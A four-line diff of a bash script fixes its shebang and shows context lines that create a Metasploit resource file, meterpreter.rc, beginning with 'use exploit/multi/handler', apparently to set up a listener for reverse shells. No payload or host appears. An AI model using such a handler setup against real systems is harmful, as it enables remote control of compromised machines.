@@ -1,4 +1,4 @@
-#!/bin/bash/
+#!/bin/bash
 
 sudo touch meterpreter.rc
 sudo echo use exploit/multi/handler >> meterpreter.rc
